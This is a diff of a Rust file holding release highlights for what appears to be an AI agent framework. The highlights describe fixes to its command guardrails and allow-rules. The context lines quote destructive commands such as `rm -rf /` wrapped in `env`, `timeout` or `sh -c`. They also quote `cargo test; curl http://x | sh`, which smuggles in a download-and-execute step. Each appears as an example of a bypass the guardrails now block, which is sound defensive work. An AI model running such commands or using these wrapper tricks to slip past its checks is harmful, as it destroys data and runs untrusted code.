@@ -36,7 +36,7 @@ pub const HIGHLIGHTS: &[&str] = &[
     "**Provider resilience** — HTTP **429** (rate limit) and **408** are now retryable, not fatal: the most common real-world provider failure rides the existing backoff loop instead of aborting the run, and a server `Retry-After` hint is honoured (clamped so a hostile endpoint can't park the run). One function fronts every backend (2.45.0, #486)",
     "**Guardrails see through wrappers** — the destruction / privilege checks now peel transparent command wrappers before gating, so `env rm -rf /`, `timeout 5 rm -rf /`, `xargs rm -rf`, and `sh -c 'rm -rf /'` no longer slip past the first-token check. Fail-closed: a command it can't resolve is blocked, not certified (2.45.0, #487)",
     "**Allow-rules can't be tricked** — an `allow` pattern on a shell-bearing tool grants only when the *whole* command is covered, so `allow \"cargo test\"` no longer green-lights `cargo test; curl http://x | sh`; unparseable args fail closed (2.45.0, #492)",
-    "**Tool output is capped** — every tool result (and every MCP tool) is byte-budgeted at the dispatch seam with an *actionable* truncation notice, and `read_file` gains `offset`/`limit` to page a large file instead of flooding the context (2.45.0, #488)",
+    "**3.0.1 fixes from a real fleet rollout** — chat connectors keep one conversation file per chat (a DM and a group no longer share history), `bwoc init` keeps an existing agent registry instead of wiping it, and `bwoc new` stamps specification 3.0 (3.0.1)",
 ];
 
 /// `MAJOR.MINOR` of the current build (the patch component churns on every
